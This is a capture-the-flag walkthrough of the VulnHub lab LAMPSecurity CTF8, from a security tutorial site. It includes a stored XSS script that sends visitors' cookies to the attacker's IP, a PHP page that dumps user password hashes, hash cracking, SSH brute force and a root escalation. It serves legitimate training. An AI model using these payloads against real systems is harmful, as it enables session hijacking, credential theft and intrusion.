<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the LAMPSecurity: CTF8 (CTF Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-lampsecurity-ctf8-ctf-challenge-2/" rel="bookmark"><time class="entry-date published" datetime="2014-08-08T06:30:19+00:00">August 8, 2014</time><time class="updated" datetime="2025-06-10T20:30:45+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Welcome to another boot2root CTF challenge “LAMPSecurity: CTF8” uploaded by madirsh2600 on vulnhub. As, there is a theme, and you will need to snag the flag in order to complete the challenge and you can download it from <strong>https://www.vulnhub.com/entry/lampsecurity-ctf8,87/</strong></span></p>
<p><span style="color: #000000;">By author, it has a good variety of techniques needed to get root – no exploit development/buffer overflows. So, on the basis of our experience and knowledge, we have made progress in solving the lab.</span></p>
<p><span style="color: #000000;"><strong>Level:</strong> Beginner</span></p>
<p><span style="color: #000000;"><strong>Penetrating Methodologies:</strong></span></p>
<ul>
<li><span style="color: #000000;">Network scanning (Nmap)</span></li>
<li><span style="color: #000000;">Surfing HTTP web services</span></li>
<li><span style="color: #000000;">Web vulnerability analysis (Nikto)</span></li>
<li><span style="color: #000000;">Directory bruteforcing (Dirb)</span></li>
<li><span style="color: #000000;">Burpsuite to capture and modify request</span></li>
<li><span style="color: #000000;">Crack the password hashes (John – The Ripper)</span></li>
<li><span style="color: #000000;">SSH brute-force (Medusa)</span></li>
<li><span style="color: #000000;">Search and Capture the flag at various stages</span></li>
</ul>
<p><span style="color: #000000;"><strong>Let’s start</strong></span></p>
<p><span style="color: #000000;">First and foremost we’ll scan the IP address with nmap. In my case, the IP address was 192.168.1.112</span></p>
<pre class="lang:default decode:true">nmap –A 192.168.1.112</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-E9hw_sJ5D70/W2qGGD_C4yI/AAAAAAAAZeA/Kmji83xAn8o8CzpwjXuo8eZohtLlknoiQCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">As we can see that port 80 is open, we will scan it with Nikto to check for web vulnerabilities</span></p>
<pre class="lang:default decode:true">nikto -h 192.168.1.112</pre>
<p><span style="color: #000000;">Here from its result, we came to know that it is vulnerable to XSS and found phpinfo.php page is also avai­lable.  </span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-ej8cnfU4xPo/W2qGIc01LoI/AAAAAAAAZeo/pSD2iUgXLXMNAQz2dG1KziqE1HR4z9cWQCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Since port 80 was opened; so I explored target IP in the web browser and welcomed by following the web page as shown below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9Af43zJMhEc/W2qGKEEl1RI/AAAAAAAAZfI/hLHSvEVi_4gXntThaVHBSX-nsH0vyfl4wCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">While checking its view-source page, here I found the first flag.</span></p>
<p><span style="color: #000000;"><strong>1<sup>st</sup> flag: –<em> #flag#550e1bafe077ff0b0b67f4e32f29d751</em></strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-XSqbno6GWwg/W2qGKZhjAhI/AAAAAAAAZfQ/wnQAp5pfmZEFoapLCsyB0Sr7nEN1-mVsACLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">In our Nikto result, we find out that phpinfo.php was available, check it as it contains various information about the PHP build and version on the target system, here we will find another flag</span></p>
<p><span style="color: #000000;"><strong>2<sup>nd</sup> flag: <em>#flag#550e1bafe077ff0b0b67f4e32f29d751</em></strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-x9KjjogtUJc/W2qGKfJVw2I/AAAAAAAAZfM/LmB4SE79a2MIShf9et2Ma11qHOM7YghbgCLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Next, at the home page, we will read the articles posted on the home page, when you will read the full article, you will find a new directory named “<em>content</em>” in the url.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-N3LDJh7l9Iw/W2qGK__pNWI/AAAAAAAAZfY/mFbRp4MmvV02csGjf0Vx14CASmRyyi4VQCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">As we haven’t seen this directory in the Nikto result, we will brute-force this directory using dirb for more details about pages inside it.</span></p>
<pre class="lang:default decode:true">dirb http://192.168.1.112/content</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-nD4YR3zRSBI/W2qGK1QIfxI/AAAAAAAAZfU/vCzCD5D-x78OXVpfvrGenF_GOEZ06nRdwCLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">In the previous result, we found a page inside the content directory named hidden, browse it and you’ll find another flag inside it.</span></p>
<p><span style="color: #000000;"><strong>3<sup>rd</sup> flag:  <em>#flag#57dbe55b42b307fb4115146d239955d0</em></strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-V0UT8RN7xa4/W2qGLKx9wqI/AAAAAAAAZfc/IMUPWxClDMwdm01oM2mrQKRwaY3PgO-bQCLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Let us create a new user to access user page</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-eKonGr1LjRI/W2qGLQytIqI/AAAAAAAAZfg/naGL2Xm18RseIKWH-rs1QEQXm4r2KQMBACLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">Let us post a small script to print hello on the page in the comment section of the article to check for cross-site scripting vulnerability</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-SajNqKyuxaY/W2qGGcIzmII/AAAAAAAAZeI/I8kbDFM1-DQN0XkI5_74x_GyojPLWFHNACLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">After posting the comment, browse the page to check if our script works and the alert proves that the cross-site scripting works</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-iBdOi_l1Aqw/W2qGGEaq9RI/AAAAAAAAZeE/KwF90pii1jAvZtKxUi2sXCizEJt0GFTGACLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Now let’s edit our script to get the session id of anyone who visits the page. Basically, we want to capture the session_id of Barbara who is the author of this article. To get the session id, we will force it to send a request to a URL which consists of our IP-address and its cookie value, so that when anyone will visit this page, it will look for a page with the name at our server and will list out the whole URL as an unreachable URL. The script for that looks something like this</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-vV8UhyWfKOQ/W2qGG9L3KeI/AAAAAAAAZeM/H2lUZohpIBUCofyHgHRJmD-sP43EnHRBACLcBGAs/s1600/12.png"/></span></p>
<pre class="lang:default decode:true">&lt;script&gt;
var request=new XMLHttpRequest();
var redirect_url=”http://192.168.1.113/”+document.cookie;
request.open(“GET”,redirect_url);
request.send();
&lt;/script&gt;</pre>
<p><span style="color: #000000;">After saving it, we now will send the link of this page to the author through the contact page in her profile</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-mocFYuHD2Z0/W2qGGx6G5_I/AAAAAAAAZeQ/RGNfarjY9uYtDwgJgmDFpFjVRcEAtiSMgCLcBGAs/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Right after sending this link, start python server in your Kali, after some time you will see that some error messages are starting to pop-up in the log, from these messages, you will find out the session id of Barbara. To start the python server, the command goes like this:</span></p>
<pre class="lang:default decode:true">python -m SimpleHTTPServer 80</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-8rHzQPlFkig/W2qGHDSQ4II/AAAAAAAAZeU/CvNVovOmce0s3LkLTnmV9-EvdQ7koeSUQCLcBGAs/s1600/14.png"/></span></p>
<p><span style="color: #000000;">Now go to home page and refresh the page to intercept its request in Burpsuite, and then replace the existing session id with the one captured in the previous step and then forward it to log in as Barbara</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-R5VAIfYrhf4/W2qGHIZ63rI/AAAAAAAAZeY/hj1JDA1cwD08UDQuCNBwAoaLwnb7GmQfwCLcBGAs/s1600/15.png"/></span></p>
<p><span style="color: #000000;">After checking about the permissions of Barbara, we came to know that she can publish a page, so we will create a PHP page to extract data from table users and dump all the usernames and passwords. The code for the following will be something like this</span></p>
<pre class="lang:default decode:true">&lt;?php
$result = db_query(‘select name,pass from users’);
while($record = db_fetch_object($result))
{
print $record-&gt;name . “:” . $record-&gt;pass . “&lt;br/&gt;”;
}
?&gt;</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-PJyS_vW4fTo/W2qGHTG4aqI/AAAAAAAAZec/IxnNMT828BUx0UHTN0urfkdFR2r0LSJCwCLcBGAs/s1600/16.png"/></span></p>
<p><span style="color: #000000;">After saving when you’ll browse the page, you will find that it has dumped the usernames and passwords on the page, save these credentials in a file</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-3V2Y_2yCybQ/W2qGHm8JD9I/AAAAAAAAZeg/58eIyGdLj2QicGkeWK5EPsJQTfkJWI3dQCLcBGAs/s1600/17.png"/></span></p>
<p><span style="color: #000000;">Use John – The Ripper to decode the values of password hashes</span></p>
<pre class="lang:default decode:true">john -w=/usr/share/wordlists/rockyou.txt -form=raw-md5 /root/Desktop/users.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-eZeDZe-Wq9o/W2qGIOQnXDI/AAAAAAAAZek/kvguOT8o2TMHvxb2sPS6QLZIQV5p3eWFgCLcBGAs/s1600/18.png"/></span></p>
<p><span style="color: #000000;">After getting the usernames and passwords, we will try to brute-force ssh on the target device to check for the correct credentials, for this we will use medusa but none of the credentials will be successful.</span></p>
<pre class="lang:default decode:true">medusa -h 192.168.1.112 -U /root/Desktop/user_list.txt -P /root/Desktop/pass.txt -M ssh</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-Cb_ho64nCTg/W2qGIZPFHYI/AAAAAAAAZes/4CKIXoLLKZM-9lNWovtKeSiUsWHCndm6wCLcBGAs/s1600/19.png"/></span></p>
<p><span style="color: #000000;">Let’s go back to basics, we know that each mail user has a display name which differs from his actual username, but his username is always used in his mail id, so we will go to each user’s profile and copy its username from his mailing address and make a new users list.</span></p>
<p><span style="color: #000000;">For example, Steve Pinkton profile name is <strong>spinkton</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-MnQX8dHgFUs/W2qGIr8BVkI/AAAAAAAAZew/Ikk9DH2pe_IPOMXXB7Lb_D_GsMZQQneAgCLcBGAs/s1600/20.png"/></span></p>
<p><span style="color: #000000;">Let’s try to brute force again, this time we will be successful as the three of the usernames will be having the password in our password list we made from the decrypted passwords</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zVbJeqf5Cd0/W2qGI5Y22gI/AAAAAAAAZe0/go6LZfnAkrsmlD4c23hI6zaYQMAmO2O_ACLcBGAs/s1600/21.png"/></span></p>
<p><span style="color: #000000;">Now let’s log in to the target device using first credentials, here we found another flag along with the banner displayed when you log in, you will find another flag, then list out all the files and directories, here you’ll find a file named flag, check its contents to discover one more flag.</span></p>
<p><span style="color: #000000;"><strong>4<sup>rd</sup> flag</strong>: <strong><em>#flag#5e937c51b852e1ee90d42ddb5ccb8997 </em></strong></span></p>
<pre class="lang:default decode:true">ls
cat flag.txt</pre>
<p><span style="color: #000000;"><strong>5<sup>th</sup> flag</strong>: <strong>#flag#0ab251c07822d26b07b88136739ae39b</strong></span></p>
<p><span style="color: #000000;">Here we try to escalate privilege using <strong>sudo su</strong> command but it gives an error that jharraway is not in the sudoers list</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uxR3iQrHmbM/W2qGJOFBCVI/AAAAAAAAZe4/8F7fPy2v-BssdWluoTXktq5P21x1G5c1QCLcBGAs/s1600/22.png"/></span></p>
<p><span style="color: #000000;">Close the current connection and login to the target device using second user: <strong>bdio’s </strong>credential, then list out all the files and directories, here you’ll find a file named flag, check its contents to discover one flag.</span></p>
<p><span style="color: #000000;">Here we try to escalate privilege using <strong>sudo su</strong> command but it gives an error that bdio is not in the sudoers list</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-kxSPvcRDeu0/W2qGJRgnqBI/AAAAAAAAZe8/5KRD1FAek3k3ZV8R4S0i5A9ett8Um8unwCLcBGAs/s1600/23.png"/></span></p>
<p><span style="color: #000000;">Again close the connection and connect using third credentials, use ls command to list files, here also you’ll find a file named flag, check its content to get one more flag, let’s try to escalate privilege using <strong>sudo su </strong>command and BANG, you are now logged in as <strong>root</strong>. List all files using ls to discover another file named flag.txt but it holds the same value as the 5<sup>th</sup> flag, check its content to discover another flag.</span></p>
<pre class="lang:default decode:true">ssh spinkton@192.168.1.112
ls
cat flag.txt
sudo su
ls
cat flag.txt</pre>
<p><span style="color: #000000;"><strong>6<sup>th</sup> flag: <em>#flag#fd38e201f27e98e13abcf62890c43303</em></strong></span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://4.bp.blogspot.com/-x1VROaTLisQ/W2qGJlKSb4I/AAAAAAAAZfA/ls9g_ciOhCMlXuZvZ_d78BMCb2U-M_gagCLcBGAs/s1600/24.png"/></strong></span></p>
<p><span style="color: #000000;">Also, you will also find one flag in /etc/passwd, to check it use</span></p>
<pre class="lang:default decode:true">cat /etc/passwd</pre>
<p><span style="color: #000000;"><strong>7<sup>th</sup> flag: <em>#flag#5b650c18929383074fea8870d857dd2e</em></strong></span></p>
<p><span style="color: #000000;">Wow!! we finished this challenge by grabbing all hidden flags.</span></p>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://4.bp.blogspot.com/-YhmwwlBRlkI/W2qGJy5oHkI/AAAAAAAAZfE/tzFxok-aRscjpCG7R3zj24NdsUhXz2D_QCLcBGAs/s1600/25.png"/></strong></span></p>
<p><span style="color: #000000;"><strong>Author</strong>:  Deepanshu is a Certified Ethical Hacker and a budding Security researcher. Contact <strong><a class="broken_link" style="color: #000000;" href="https://www.linkedin.com/in/deepanshu-k-a4248b138/">here</a>.</strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
